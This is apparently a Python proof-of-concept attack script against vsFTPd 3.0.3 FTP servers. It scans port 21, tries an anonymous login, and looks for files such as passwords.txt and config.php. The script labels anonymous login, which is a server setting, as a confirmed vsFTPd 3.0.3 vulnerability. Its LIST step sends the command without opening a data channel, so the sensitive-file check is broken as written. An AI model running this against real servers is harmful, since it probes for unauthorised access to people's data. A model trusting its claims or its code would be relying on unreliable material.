"""
PoC for the vulnerability in vsFTPd 3.0.3 
credits: hackerino12
"""

import socket
import time
import colorama

# colours
colorama.init(autoreset=True)
color_red = colorama.Fore.RED

#define the variables
host = "192.168.1.10"  # replace with the target IP address
port = 21 

# scan the service is available
def scan_ftp(host, port):
    try:
        s = socket.socket()
        result = s.connect_ex((host, port))
        if result == 0:
            print(f"Port {port} is open on {host}")
            s.close()
            return True
        else:
            print(f"Port {port} is closed on {host}")
            s.close()
            return False
    except Exception as e:
        print(f"Error scanning {host}:{port} - {e}")
        return False


# PoC for the vulnerability 
def exploit_ftp(host, port):
    try:
        s = socket.socket()
        s.connect((host, port))

        banner = s.recv(1024).decode(errors="ignore")

        if banner.startswith("220") and "vsFTPd" in banner:
            print(color_red + f"Warning: potentially vulnerable FTP service found on {host}:{port}")

            
            s.send(b"USER anonymous\r\n")
            s.recv(1024)

            s.send(b"PASS test@test.com\r\n")
            time.sleep(0.5)

            response = s.recv(1024).decode(errors="ignore")

            if response.startswith("230") or "Login successful" in response:
                print(color_red + f"Vulnerability confirmed: anonymous login successful on {host}:{port}")

            
                s.send(b"LIST\r\n")
                time.sleep(0.5)

                data = s.recv(4096).decode(errors="ignore")

                if any(file in data for file in ["passwords.txt", "backup.zip", "config.php"]):
                    print(f"Sensitive files found on {host}:{port}")
                else:
                    print("No obvious sensitive files found")

            else:
                print(color_red + f"Vulnerability not confirmed: anonymous login failed on {host}:{port}")
        else:
            print("FTP service detected but not matching vsFTPd banner")

        s.close()

    except Exception as e:
        print(f"Error exploiting {host}:{port} - {e}")


# run
if scan_ftp(host, port):
    exploit_ftp(host, port)